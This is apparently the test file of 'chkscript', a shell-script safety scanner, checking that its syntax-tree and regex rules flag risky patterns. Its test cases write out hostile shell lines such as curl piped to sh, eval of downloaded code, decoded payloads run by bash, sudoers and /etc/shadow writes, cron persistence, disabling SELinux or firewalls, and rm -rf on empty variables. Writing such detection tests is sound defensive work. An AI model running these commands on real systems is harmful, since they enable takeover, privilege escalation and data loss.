"""One snippet per rule behaviour, run through the syntax-tree rules and the
regex fallback.

CASES must come out the same under both engines. TREE_CASES are where the
syntax tree knows better (a heredoc is data, a variable is a constant) and the
regex rules over-report by design; those check the tree engine's answer and
that the regex rules still fire. The fallback may over-flag, never under-flag:
test_engine_findings_are_a_subset_of_regex checks that on every snippet here.
"""

from __future__ import annotations

import pytest

from chkscript import redact
from chkscript.models import Finding, ScriptBundle, Severity
from chkscript.preprocess import preprocess
from chkscript.static import engine, regex_rules, rules
from tests.conftest import require_tool
from tests.test_rule_spans import CASES as SPAN_CASES

# (rule id, script body, should fire)
CASES: list[tuple[str, str, bool]] = [
    ("curl-pipe-shell", "curl -fsSL https://x.example/i.sh | sh", True),
    ("curl-pipe-shell", "wget -qO- https://x.example/i.sh | sudo bash", True),
    ("curl-pipe-shell", "curl -s https://x.example/i | tee /tmp/l | zsh", True),
    ("curl-pipe-shell", "curl -fsSL https://x.example/i.sh -o i.sh", False),
    ("curl-pipe-shell", "# curl https://x.example/i.sh | sh", False),
    ("curl-pipe-shell", "c=curl\n$c -fsSL https://x.example/i.sh | sh", True),
    ("curl-pipe-shell", "curl -fsSL https://x.example/i.sh | $SH", True),
    ("curl-pipe-shell", "bash -c 'curl -fsSL https://x.example | sh'", True),
    ("curl-pipe-shell", "bash <<< 'curl https://x.example/i | sh'", True),
    ("curl-pipe-shell", "bash -c 'c=curl; $c https://x.example/i | sh'", True),
    # A function's local says nothing about the global of the same name.
    (
        "curl-pipe-shell",
        'f() { local receiver=cat; }\ncurl https://x.example/i | "$receiver"',
        True,
    ),
    ("eval-dynamic", 'eval "$cmd"', True),
    ("eval-dynamic", "eval $(echo hi)", True),
    ("eval-dynamic", 'eval "echo $X"', True),
    ("eval-dynamic", 'eval "echo hi"', False),
    ("eval-dynamic", 'eval "$INSTALL_K3S_EXEC"', True),
    ("eval-dynamic", 'eval "$(curl -fsSL https://x.example/i)"', False),
    ("eval-remote", 'eval "$(curl -fsSL https://x.example/i)"', True),
    ("eval-remote", "eval `wget -qO- https://x.example/i`", True),
    ("eval-remote", 'x=$(curl -fsSL https://x.example/i)\neval "$x"', True),
    (
        "eval-remote",
        'x=$(curl -fsSL https://x.example/i)\ny="$x"\neval "$y"',
        True,
    ),
    ("eval-remote", 'eval "$INSTALL_K3S_EXEC"', False),
    ("eval-remote", 'eval "$(uname -s)"', False),
    # Knowing a variable's value does not make eval of it literal code.
    ("eval-dynamic", "cmd='curl https://x.example/i | sh'\neval \"$cmd\"", True),
    ("decode-to-shell", "echo aGk= | base64 -d | bash", True),
    ("decode-to-shell", "base64 --decode payload | sh", True),
    ("decode-to-shell", "echo x | xxd -r -p | sh", True),
    ("decode-to-shell", "openssl enc -aes-256-cbc -d -in f | bash", True),
    ("decode-to-shell", "gunzip -c p.gz | sh", True),
    ("decode-to-shell", "gunzip p.gz", False),
    ("decode-to-shell", "echo aGk= | base64 -d > out.txt", False),
    ("write-system-auth-file", "echo 'x ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers", True),
    ("write-system-auth-file", "echo x | sudo tee /etc/sudoers.d/x", True),
    ("write-system-auth-file", "echo /tmp/x.so > /etc/ld.so.preload", True),
    ("write-system-auth-file", "cp shadow.bak /etc/shadow", True),
    ("write-system-auth-file", 'echo x | sudo tee "/etc/sudoers.d/$NAME"', True),
    ("write-system-auth-file", ">/etc/shadow", True),
    ("write-system-auth-file", "X=1 >/etc/shadow", True),
    ("write-system-auth-file", "grep root /etc/passwd", False),
    ("persistence-append", "echo 'export X=1' >> ~/.bashrc", True),
    ("persistence-append", 'echo "run" >> "$HOME/.zshrc"', True),
    ("persistence-append", "echo x | sudo tee -a ~/.profile", True),
    ("persistence-append", "(crontab -l; echo '* * * * * /tmp/x') | crontab -", True),
    ("persistence-append", "cp x.service /etc/systemd/system/x.service", True),
    ("persistence-append", "crontab -l", False),
    ("persistence-append", "cat ~/.bashrc", False),
    ("insecure-permissions", "chmod 777 /tmp/foo", True),
    ("insecure-permissions", "chmod u+s ~/bin/tool", True),
    ("insecure-permissions", 'chmod 4755 "$BIN"', True),
    ("insecure-permissions", "chmod 4755 /tmp/tool", True),
    ("insecure-permissions", "chmod 4755 /usr/local/bin/tool", False),
    # Setuid in a root-owned system path is a capability, not unsafe.
    ("setuid-system", "chmod +s /usr/local/bin/tool", True),
    ("setuid-system", "chmod 4755 /usr/local/bin/tool", True),
    ("setuid-system", "chmod u+s ~/bin/tool", False),
    ("setuid-system", "chmod 755 /usr/local/bin/tool", False),
    ("insecure-permissions", 'chown root:root "$HOME/bin/tool"', True),
    ("insecure-permissions", "sudo chmod -R 777 /opt/x", True),
    ("insecure-permissions", "chmod 755 /usr/local/bin/tool", False),
    ("insecure-permissions", "chown root:root /usr/local/bin/tool", False),
    ("rm-rf-unguarded", 'rm -rf "$DIR/"', True),
    ("rm-rf-unguarded", "rm -fr ${PREFIX}/lib", True),
    ("rm-rf-unguarded", 'DIR=\nrm -rf "$DIR/"', True),
    ("rm-rf-unguarded", 'DIR=/\nrm -rf --no-preserve-root "$DIR"', True),
    ("rm-rf-unguarded", "DIR=/\nrm -rf $DIR", True),
    ("rm-rf-unguarded", 'rm -rf "$TMP/"*', True),
    ("rm-rf-unguarded", "rm -rf /tmp/build", False),
    ("rm-rf-unguarded", 'rm -f "$TMP/x"', False),
    ("runs-as-root", "sudo apt-get update", True),
    ("runs-as-root", "doas make install", True),
    (
        "runs-as-root",
        'if [ "$(id -u)" -ne 0 ]; then\n  echo root\n  exit 1\nfi',
        True,
    ),
    ("runs-as-root", '[ "$EUID" -eq 0 ] || exit 1', True),
    ("runs-as-root", "apt-get update", False),
    ("runs-as-root", "echo try sudo", False),
    ("system-path-write", "sudo install -m 755 k3d /usr/local/bin/k3d", True),
    ("system-path-write", "cp tool /opt/tool/bin/", True),
    ("system-path-write", "echo x > /etc/myapp.conf", True),
    ("system-path-write", "tar -xzf t.tgz -C /usr/local", True),
    ("system-path-write", "cp tool ~/.local/bin/tool", False),
    ("system-path-write", "echo x | sudo tee /etc/sudoers.d/x", False),
    ("system-path-write", "cp x.service /etc/systemd/system/x.service", False),
    ("system-path-write", "cat /usr/local/bin/tool", False),
    (
        "package-repo-added",
        'echo "deb [signed-by=/k.gpg] https://d.example s main" '
        "| sudo tee /etc/apt/sources.list.d/d.list",
        True,
    ),
    (
        "package-repo-added",
        "curl -fsSL https://d.example/k | sudo apt-key add -",
        True,
    ),
    ("package-repo-added", "sudo rpm --import https://d.example/k.asc", True),
    (
        "package-repo-added",
        "sudo dnf config-manager --add-repo https://d.example/d.repo",
        True,
    ),
    ("package-repo-added", "sudo add-apt-repository ppa:x/y", True),
    ("package-repo-added", "cp d.repo /etc/yum.repos.d/d.repo", True),
    ("package-repo-added", "cat /etc/apt/sources.list", False),
    ("package-repo-added", "apt-get install -y curl", False),
    ("root-equivalent-group", 'sudo usermod -aG docker "$USER"', True),
    ("root-equivalent-group", 'gpasswd -a "$USER" lxd', True),
    ("root-equivalent-group", 'adduser "$USER" libvirt', True),
    ("root-equivalent-group", "usermod -a -G disk,video bob", True),
    ("root-equivalent-group", 'sudo usermod -aG sudo "$USER"', False),
    ("root-equivalent-group", "usermod -aG wheel bob", False),
    ("root-equivalent-group", "groups bob", False),
    ("disable-security", "setenforce 0", True),
    ("disable-security", "ufw disable", True),
    ("disable-security", "systemctl disable --now apparmor", True),
    ("disable-security", "sudo systemctl disable --now cups apparmor", True),
    ("disable-security", "systemctl disable cups", False),
    ("http-download", "curl -o f http://example.com/f", True),
    ("http-download", "wget http://example.com/f.tar.gz", True),
    ("http-download", "curl -o f https://example.com/f", False),
    ("http-download", "echo see http://example.com", False),
    (
        "unverified-download",
        "curl -fsSL -o /tmp/t https://x.example/t\nchmod +x /tmp/t",
        True,
    ),
    (
        "unverified-download",
        "wget -O /tmp/t https://x.example/t\nchmod 755 /tmp/t",
        True,
    ),
    (
        "unverified-download",
        "# verified with sha256sum\ncurl -o /tmp/t https://x.example/t\n"
        "chmod +x /tmp/t",
        True,
    ),
    (
        "unverified-download",
        "curl -o /tmp/t https://x.example/t\nsha256sum -c t.sha256\nchmod +x /tmp/t",
        False,
    ),
    (
        "unverified-download",
        "curl -o /tmp/t https://x.example/t\ncosign verify-blob t\nchmod +x /tmp/t",
        False,
    ),
    ("unverified-download", "chmod +x ./build.sh", False),
    # Per downloaded file: verifying one download does not cover another.
    (
        "unverified-download",
        "curl -o /tmp/a https://x.example/a\ncurl -o /tmp/b https://x.example/b\n"
        "sha256sum /tmp/a\nchmod +x /tmp/b",
        True,
    ),
    (
        "unverified-download",
        "curl -o /tmp/a https://x.example/a\ncurl -o /tmp/b https://x.example/b\n"
        "sha256sum /tmp/a\nchmod +x /tmp/a",
        False,
    ),
    # Tied through an archive: download $exe.zip, unzip, chmod $exe.
    (
        "unverified-download",
        'curl -o "$exe.zip" https://x.example/t.zip\nunzip "$exe.zip"\n'
        'chmod +x "$exe"',
        True,
    ),
    ("curl-pipe-shell", "cat <<< 'curl https://x.example/i | sh' | bash", True),
    # A child shell sees an outer variable only when it is passed or exported.
    (
        "rm-rf-unguarded",
        "DIR=/opt/x\nenv DIR= bash -c 'rm -rf --no-preserve-root \"$DIR/\"'",
        True,
    ),
    ("rm-rf-unguarded", "DIR=/opt/x\nbash -c 'rm -rf \"$DIR/\"'", True),
    ("curl-pipe-shell", "url=http://x.example/i.sh\nbash -c 'curl $url | sh'", True),
    ("rm-rf-unguarded", "DIR=/opt/x\nsh <<'EOF'\nrm -rf \"$DIR/\"\nEOF", True),
    ("rm-rf-unguarded", "DIR=/opt/x\nbash <<< 'rm -rf \"$DIR/\"'", True),
    ("rm-rf-unguarded", 'DIR=/opt/x\nbash -c "rm -rf \\"\\$DIR/\\""', True),
    (
        "rm-rf-unguarded",
        "export DIR=/opt/x\nenv -u DIR bash -c 'rm -rf \"$DIR/\"'",
        True,
    ),
    ("rm-rf-unguarded", "export DIR=/opt/x\nenv -i bash -c 'rm -rf \"$DIR/\"'", True),
    # env -i discards names set before it, on the command or by an earlier env.
    (
        "rm-rf-unguarded",
        "DIR=/opt/x env -i bash -c 'rm -rf --no-preserve-root \"$DIR/\"'",
        True,
    ),
    (
        "rm-rf-unguarded",
        "env DIR=/opt/x env -i bash -c 'rm -rf --no-preserve-root \"$DIR/\"'",
        True,
    ),
    ("rm-rf-unguarded", "export DIR=/opt/x\nsudo bash -c 'rm -rf \"$DIR/\"'", True),
    (
        "rm-rf-unguarded",
        "f() { export DIR=/opt/x; }\nf\nbash -c 'rm -rf \"$DIR/\"'",
        True,
    ),
    # Backslash continuations: both engines see the command on its first line.
    ("rm-rf-unguarded", 'rm -rf \\\n  "$DIR/"', True),
    ("curl-pipe-shell", "curl -fsSL https://x.example/i.sh \\\n  | sh", True),
    ("curl-pipe-shell", "cu\\\nrl -fsSL https://x.example/i.sh | sh", True),
    # A backslash ending a comment does not continue it, so the next line runs.
    ("rm-rf-unguarded", '# clean up \\\nrm -rf "$DIR/"', True),
]

# (rule id, script body, does the syntax-tree engine fire): the regex rules
# fire on every one of these.
TREE_CASES: list[tuple[str, str, bool]] = [
    # Only a root check that ends the script counts, not choosing sudo.
    (
        "runs-as-root",
        'if [ "$(id -u)" -eq 0 ]; then SUDO=; else SUDO=sudo; fi',
        False,
    ),
    # Text inside a string or a printed heredoc is data.
    ("curl-pipe-shell", 'echo "run: curl https://x.example/i.sh | sh"', False),
    ("curl-pipe-shell", "cat <<EOF\ncurl https://x.example/i.sh | sh\nEOF", False),
    ("eval-dynamic", 'cat <<EOS\n  eval "$(brew shellenv)"\nEOS', False),
    # A heredoc fed to a shell is code, reported on its own line.
    ("rm-rf-unguarded", 'sh <<EOF\nrm -rf "$X/"\nEOF', True),
    # `| sudo tee` writes a file; it does not run the download.
    ("curl-pipe-shell", "curl -fsSL https://x.example/k | sudo tee /etc/k", False),
    # A constant path is not a variable that can be empty.
    ("rm-rf-unguarded", 'DIR=/opt/x\nrm -rf "$DIR/"', False),
    # The child shell provably sees the constant: exported, passed on the
    # command, or expanded by the outer shell before the child runs.
    ("rm-rf-unguarded", "export DIR=/opt/x\nbash -c 'rm -rf \"$DIR/\"'", False),
    ("rm-rf-unguarded", "DIR=/opt/x\nexport DIR\nbash -c 'rm -rf \"$DIR/\"'", False),
    ("rm-rf-unguarded", "declare -x DIR=/opt/x\nbash -c 'rm -rf \"$DIR/\"'", False),
    ("rm-rf-unguarded", "DIR=/opt/x bash -c 'rm -rf \"$DIR/\"'", False),
    ("rm-rf-unguarded", 'DIR=/opt/x\nbash -c "rm -rf \\"$DIR/\\""', False),
    ("rm-rf-unguarded", 'DIR=/opt/x\nsh <<EOF\nrm -rf "$DIR/"\nEOF', False),
    # The chmod'ed file is not the download.
    (
        "unverified-download",
        "curl -o /tmp/t https://x.example/t\nchmod +x ./build.sh",
        False,
    ),
    # A function that downloads its arguments is followed to the call.
    (
        "unverified-download",
        'dl() {\n  curl -fsSL -o "$2" "$1"\n}\ndl https://x.example/t /tmp/t\n'
        "chmod +x /tmp/t",
        True,
    ),
]


# (tree rule id, regex rule id, script body): the syntax tree tells a quoted
# or guarded variable from an unguarded one; the fallback reports every
# `rm -rf` on a variable as unguarded (regex_rules.TREE_ONLY).
SPLIT_CASES: list[tuple[str, str, str]] = [
    ("rm-rf-variable", "rm-rf-unguarded", 'rm -rf "$TMP"'),
    ("rm-rf-variable", "rm-rf-unguarded", 'rm -r -f "$TMP"'),
    ("rm-rf-variable", "rm-rf-unguarded", 'rm -rf "${DIR:?}/lib"'),
    ("rm-rf-variable", "rm-rf-unguarded", 'sh <<EOF\nrm -rf "$X"\nEOF'),
    ("rm-rf-variable", "rm-rf-unguarded", 'rm -rf \\\n  "$DIR"'),
    ("rm-rf-variable", "rm-rf-unguarded", 'f() {\n  rm -rf "$1"\n}'),
]

# (rule id, script body, does the tree fire): capability findings only the
# tree can see, such as a write target known from a variable's default. The
# fallback may miss these; they carry no floor.
TREE_ONLY_CASES: list[tuple[str, str, bool]] = [
    ("system-path-write", ': "${DIR:=/usr/local/bin}"\ncp tool "$DIR/tool"', True),
    (
        "system-path-write",
        'if [ -n "$X" ]; then BIN=$X; else BIN=/usr/local/bin; fi\ncp t "$BIN/t"',
        True,
    ),
    (
        "persistence-append",
        'UNIT=/etc/systemd/system/x.service\nF="$UNIT"\nf() { F=$1; }\n'
        'cat > "$F" <<EOF\n[Unit]\nEOF',
        True,
    ),
    (
        "runs-as-root",
        'run() {\n  local CMD="$*"\n  CMD="sudo $CMD"\n  $CMD\n}\nrun cp a /opt/a',
        True,
    ),
]


def _bundle(body: str) -> ScriptBundle:
    return preprocess(f"#!/bin/bash\n{body}\n".encode())


def _rule_ids(findings: list[Finding]) -> set[str]:
    return {f.rule_id for f in findings if f.rule_id in rules.RULE_IDS}


def _tree(bundle: ScriptBundle) -> list[Finding]:
    require_tool("shfmt")
    outcome = engine.scan(bundle)
    assert outcome.parsed, f"shfmt did not parse: {bundle.text!r}"
    return outcome.findings


def _regex(bundle: ScriptBundle) -> list[Finding]:
    return regex_rules.run(bundle)


def _ids(cases: list[tuple[str, str, bool]]) -> list[str]:
    return [f"{r}-{i}-{'hit' if f else 'miss'}" for i, (r, _, f) in enumerate(cases)]


@pytest.mark.parametrize("engine_name", ["shfmt", "regex"])
@pytest.mark.parametrize(("rule_id", "body", "fires"), CASES, ids=_ids(CASES))
def test_rule(engine_name: str, rule_id: str, body: str, fires: bool) -> None:
    run = _tree if engine_name == "shfmt" else _regex
    assert (rule_id in _rule_ids(run(_bundle(body)))) is fires


@pytest.mark.parametrize(("rule_id", "body", "fires"), TREE_CASES, ids=_ids(TREE_CASES))
def test_tree_rule(rule_id: str, body: str, fires: bool) -> None:
    bundle = _bundle(body)
    assert (rule_id in _rule_ids(_tree(bundle))) is fires
    assert rule_id in _rule_ids(_regex(bundle)), "the fallback must over-report"


@pytest.mark.parametrize(
    ("tree_id", "regex_id", "body"), SPLIT_CASES, ids=[b for _, _, b in SPLIT_CASES]
)
def test_split_rule(tree_id: str, regex_id: str, body: str) -> None:
    bundle = _bundle(body)
    tree = _rule_ids(_tree(bundle))
    assert tree_id in tree
    assert regex_id not in tree
    assert regex_id in _rule_ids(_regex(bundle))


@pytest.mark.parametrize(
    ("rule_id", "body", "fires"), TREE_ONLY_CASES, ids=_ids(TREE_ONLY_CASES)
)
def test_tree_only_rule(rule_id: str, body: str, fires: bool) -> None:
    assert (rule_id in _rule_ids(_tree(_bundle(body)))) is fires


ALL_BODIES = sorted(
    {body for _, body, _ in CASES}
    | {body for _, body, _ in TREE_CASES}
    | {body for _, _, body in SPLIT_CASES}
    | {body for _, body, _ in TREE_ONLY_CASES}
    | {body for _, body in SPAN_CASES}
)


@pytest.mark.parametrize("body", ALL_BODIES, ids=lambda body: repr(body)[:40])
def test_engine_findings_are_a_subset_of_regex(body: str) -> None:
    """Every unsafe (rule, line) the tree engine reports, the regex rules
    report too: losing the parser never lowers the floor."""
    bundle = _bundle(body)
    tree = {(f.rule_id, f.line) for f in _tree(bundle) if f.category == "unsafe"}
    regex = {(f.rule_id, f.line) for f in _regex(bundle)}
    assert tree <= regex


def test_every_rule_has_a_hit_and_a_miss() -> None:
    for rule_id in rules.RULE_IDS - regex_rules.TREE_ONLY:
        outcomes = {fires for r, _, fires in CASES if r == rule_id}
        assert outcomes == {True, False}, rule_id
    for rule_id in regex_rules.TREE_ONLY:
        assert any(r == rule_id for r, _, _ in SPLIT_CASES), rule_id


def test_engines_share_rule_ids() -> None:
    assert regex_rules.REGEX_RULE_IDS == rules.RULE_IDS - regex_rules.TREE_ONLY
    unsafe = {r for r, c in rules.CATEGORIES.items() if c == "unsafe"}
    assert unsafe <= regex_rules.REGEX_RULE_IDS, "every unsafe rule needs a fallback"


def test_every_rule_has_a_category() -> None:
    assert set(rules.CATEGORIES) == rules.RULE_IDS


def test_every_capability_rule_has_a_group_and_label() -> None:
    capability = {r for r, c in rules.CATEGORIES.items() if c == "capability"}
    for rule_id in capability:
        assert rule_id in rules.GROUPS, f"{rule_id} has no footprint group"
        assert rules.label(rule_id), f"{rule_id} has no report label"
    # Groups belong to capability rules only, and to hardcoded-secret, which
    # preprocessing produces.
    assert set(rules.GROUPS) == capability | {"hardcoded-secret"}


@pytest.mark.parametrize("engine_name", ["shfmt", "regex"])
def test_severity_and_group_follow_the_category(engine_name: str) -> None:
    run = _tree if engine_name == "shfmt" else _regex
    body = (
        "sudo cp x.service /etc/systemd/system/x.service\ncurl https://x.example | sh"
    )
    findings = run(_bundle(body))
    assert {f.rule_id for f in findings} == {
        "runs-as-root",
        "persistence-append",
        "curl-pipe-shell",
    }
    for finding in findings:
        category = rules.CATEGORIES[finding.rule_id or ""]
        assert finding.category == category
        unsafe = category == "unsafe"
        assert finding.severity == (Severity.UNSAFE if unsafe else Severity.WARNING)
        assert finding.group == rules.GROUPS.get(finding.rule_id or "")


@pytest.mark.parametrize("engine_name", ["shfmt", "regex"])
@pytest.mark.parametrize(
    ("body", "scope"),
    [
        (
            'echo "deb [signed-by=/etc/apt/keyrings/d.gpg] https://d.example s main"'
            " | sudo tee /etc/apt/sources.list.d/d.list",
            "scoped",
        ),
        (
            'echo "deb https://d.example s main" '
            "| sudo tee /etc/apt/sources.list.d/d.list",
            "global",
        ),
        ("curl -fsSL https://d.example/k | sudo apt-key add -", "global"),
        (
            "curl -fsSL https://d.example/k "
            "| sudo gpg --dearmor -o /etc/apt/trusted.gpg.d/d.gpg",
            "global",
        ),
    ],
)
def test_package_repo_names_the_key_scope(
    engine_name: str, body: str, scope: str
) -> None:
    run = _tree if engine_name == "shfmt" else _regex
    [repo] = [f for f in run(_bundle(body)) if f.rule_id == "package-repo-added"]
    assert repo.description == rules.message("package-repo-added", scope)
    assert repo.label == rules.label("package-repo-added", scope)
    assert scope in (repo.label or "") or scope == "global"
    assert repo.group == "trust"


def test_package_repo_scope_reads_a_heredoc_source() -> None:
    body = (
        "cat <<EOF | sudo tee /etc/apt/sources.list.d/d.list\n"
        "deb [signed-by=/etc/apt/keyrings/d.gpg] https://d.example s main\nEOF"
    )
    [repo] = [f for f in _tree(_bundle(body)) if f.rule_id == "package-repo-added"]
    assert repo.label == rules.label("package-repo-added", "scoped")


@pytest.mark.parametrize("engine_name", ["shfmt", "regex"])
@pytest.mark.parametrize(
    ("body", "kind", "subject"),
    [
        ("cp k.service /etc/systemd/system/k3s.service", "systemd", "k3s.service"),
        ("echo 'export X=1' >> ~/.bashrc", "rc", ".bashrc"),
        ("echo x > /etc/cron.d/job", "cron", "job"),
        ("(crontab -l; echo '* * * * * x') | crontab -", "cron", "crontab"),
    ],
)
def test_persistence_names_what_it_installs(
    engine_name: str, body: str, kind: str, subject: str
) -> None:
    run = _tree if engine_name == "shfmt" else _regex
    [found] = [f for f in run(_bundle(body)) if f.rule_id == "persistence-append"]
    assert found.label == rules.label("persistence-append", kind)
    assert found.subject == subject


@pytest.mark.parametrize("engine_name", ["shfmt", "regex"])
def test_root_equivalent_group_names_the_group(engine_name: str) -> None:
    run = _tree if engine_name == "shfmt" else _regex
    found = run(_bundle('sudo usermod -aG docker "$USER"'))
    [group] = [f for f in found if f.rule_id == "root-equivalent-group"]
    assert (group.subject, group.group) == ("docker", "trust")


def test_hardcoded_secret_group_and_label_match_the_catalog() -> None:
    bundle = preprocess(
        b'#!/bin/bash\nGITHUB_TOKEN="ghp_0123456789abcdefghijABCDEFGHIJ012345"\n'
    )
    [finding] = redact.secret_findings(bundle)
    assert finding.group == rules.GROUPS["hardcoded-secret"]
    assert finding.label == rules.label("hardcoded-secret")
    assert finding.subject == bundle.secrets[0].placeholder


def test_tree_findings_use_source_shfmt() -> None:
    [finding] = _tree(_bundle("curl -fsSL https://x.example/i.sh | sh"))
    assert finding.source == "shfmt"
    assert finding.line == 2
    assert finding.description == rules.MESSAGES["curl-pipe-shell"]
    assert finding.category == "unsafe"
    assert finding.group is None


def test_unparseable_embedded_code_falls_back_to_regex() -> None:
    findings = _tree(_bundle("bash -c 'if then (( curl x | sh'"))
    pipe = [f for f in findings if f.rule_id == "curl-pipe-shell"]
    assert [(f.source, f.line) for f in pipe] == [("regex", 2)]
